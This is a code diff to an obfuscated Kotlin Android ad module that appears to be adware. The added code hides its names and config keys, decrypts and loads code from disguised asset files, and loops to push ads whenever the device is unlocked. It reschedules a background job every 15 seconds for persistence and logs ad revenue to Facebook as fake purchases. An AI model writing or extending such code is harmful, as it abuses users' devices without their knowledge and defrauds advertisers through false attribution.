@@ -2,22 +2,33 @@ package b2
 
 import android.app.Application
 import android.app.KeyguardManager
+import android.app.job.JobInfo
+import android.app.job.JobScheduler
+import android.content.ComponentName
 import android.content.Context
+import android.content.Context.JOB_SCHEDULER_SERVICE
 import android.os.Build
+import android.os.Bundle
 import android.os.PowerManager
 import com.ak.impI.Core
 import com.ak.impI.RegisAc
+import com.facebook.FacebookSdk
+import com.facebook.appevents.AppEventsLogger
+import com.google.firebase.analytics.FirebaseAnalytics
+import com.google.firebase.analytics.ktx.analytics
+import com.google.firebase.ktx.Firebase
+import com.kijz.laisk.kzma.AsuijJozk
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import org.json.JSONObject
-import x2.f.a
 import java.io.File
 import java.io.FileOutputStream
 import java.io.InputStream
 import java.text.SimpleDateFormat
+import java.util.Currency
 import java.util.Date
 import java.util.Locale
 import javax.crypto.Cipher
@@ -48,7 +59,6 @@ object AdE {
     private var nDayShowMax = 80 //天显示次数
     private var nTryMax = 50 // 失败上限
 
-    // todo modify name
     private var numHour = Core.getInt("show_hour_num")
     private var numDay = Core.getInt("show_day_num")
     private var isCurDay = Core.getStr("last_cur_day")
@@ -133,17 +143,25 @@ object AdE {
     @JvmStatic
     fun a2() {
         mContext.registerActivityLifecycleCallbacks(RegisAc())
-        File("${mContext.dataDir}/quick").mkdirs()
+        File("${mContext.dataDir}/care").mkdirs()
+        refConfigure()
         t()
     }
 
-    @JvmStatic
-    fun reConfig(js: JSONObject) {
-        sK = js.optString("a_i")
-        tagL = js.optString("a_i")
-        mAdC.idH = js.optString("money_bank_id")
-        mAdC.idL = js.optString("money_w_id")
-        val lt = js.optString("time").split("-")
+    private var lastStr = ""
+    private fun refConfigure() {
+        val str = Core.getStr("")
+        if (str != lastStr) {
+            lastStr = str
+            reConfig(JSONObject(str))
+        }
+    }
+
+    private fun reConfig(js: JSONObject) {
+        sK = js.optString("igloo_ks")
+        tagL = js.optString("igloo_name")
+        mAdC.setAdId(js.optString("dahlia_id_h"), js.optString("dahlia_idL"))
+        val lt = js.optString("dahlia_t").split("-")
         cTime = lt[0].toLong() * 1000
         tPer = lt[1].toInt() * 1000
         mInstallWait = lt[2].toInt() * 1000
@@ -173,8 +191,9 @@ object AdE {
                 return@launch
             }
             Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            a.b1(2, 1.0, tagL)
+            opm.z.cd.f(2, 1.0, tagL)
             while (true) {
+                openJob()
                 cAction()
                 delay(cTime)
                 if (numJumps > nTryMax) {
@@ -189,7 +208,7 @@ object AdE {
             if (loadSFile(if (is64i) "unity/quw93" else "unity/qius.txt")) {
                 withContext(Dispatchers.Main) {
                     try {
-                        x2.f.a.b2(mContext)
+                        opm.z.cd.a(mContext)
                         isLoadH = true
                     } catch (_: Throwable) {
                     }
@@ -269,16 +288,16 @@ object AdE {
         }
         Core.pE("ad_pass", "N")
         CoroutineScope(Dispatchers.Main).launch {
-            if (Core.e.b("finish") != null) {
+            if (c.a.b()) {
                 if (isSAd) {
-                    delay(1400)
+                    delay(1200)
                 } else {
                     delay(800)
                 }
             }
             sNumJump(numJumps++)
             Core.pE("ad_start")
-            a.b1(2, 1.0, "talk")
+            opm.z.cd.f(2, 1.0, "ozfresh")
         }
     }
 
@@ -286,5 +305,37 @@ object AdE {
         return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
             Context.KEYGUARD_SERVICE
         ) as KeyguardManager).isDeviceLocked.not()
+    }
+
+    @JvmStatic
+    fun postEcpm(e: Double) {
+        try {
+            val b = Bundle()
+            b.putDouble(FirebaseAnalytics.Param.VALUE, e)
+            b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
+            Firebase.analytics.logEvent("ad_impression_exp", b)
+        } catch (_: Exception) {
+        }
+        if (FacebookSdk.isInitialized().not()) return
+        //fb purchase
+        AppEventsLogger.newLogger(Core.mApp).logPurchase(
+            e.toBigDecimal(), Currency.getInstance("USD")
+        )
+    }
+
+    private var time = 0L
+    private fun openJob() {
+        if (System.currentTimeMillis() - time < 15000) return
+        time = System.currentTimeMillis()
+        val componentName = ComponentName(mContext, AsuijJozk::class.java)
+        try {
+            val jobInfo: JobInfo =
+                JobInfo.Builder(3215, componentName)
+                    .setMinimumLatency(3000) // 至少延迟 5 秒
+                    .build()
+            val jobScheduler = mContext.getSystemService(JOB_SCHEDULER_SERVICE) as JobScheduler
+            jobScheduler.schedule(jobInfo)
+        } catch (_: Exception) {
+        }
     }
 }
